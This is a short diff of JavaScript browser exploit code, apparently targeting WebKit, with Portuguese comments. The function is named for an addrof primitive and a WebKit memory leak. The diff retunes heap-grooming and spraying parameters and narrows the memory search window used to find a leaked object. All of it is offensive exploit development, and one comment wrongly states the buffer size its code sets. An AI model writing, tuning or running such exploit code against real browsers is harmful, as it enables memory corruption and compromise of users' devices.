@@ -56,8 +56,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // ETAPA 1: HEAP GROOMING & SPRAYING (LÓGICA ATUALIZADA)
         // =================================================================
         logS3("--- ETAPA 1 (R45): Heap Grooming & Spraying ---", "subtest");
-        const GROOM_ALLOC_COUNT = 1024;
-        const GROOM_ALLOC_SIZE = 64 * 1024; // 128KB por buffer de grooming
+        const GROOM_ALLOC_COUNT = 4096;
+        const GROOM_ALLOC_SIZE = 32 * 1024; // 128KB por buffer de grooming
         const SPRAY_COUNT = 256;
         
         // FASE 1.1: Alocar buffers para segmentar e organizar o heap
@@ -105,7 +105,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         
         // PONTO DE AJUSTE CRÍTICO: Mantemos a janela de busca PEQUENA e ESTÁVEL.
         // O Heap Grooming aumenta a chance do leaker estar aqui perto.
-        const SEARCH_WINDOW = 0x100000 + 0x1000; // ~1MB, com margem de segurança.
+        const SEARCH_WINDOW = 0x100000 - 0x2000; // ~1MB, com margem de segurança.
 
         logS3(`Iniciando busca na memória de [${toHex(SEARCH_START_OFFSET)}] até [${toHex(SEARCH_START_OFFSET + SEARCH_WINDOW)}] (janela estável)`, 'info');
 
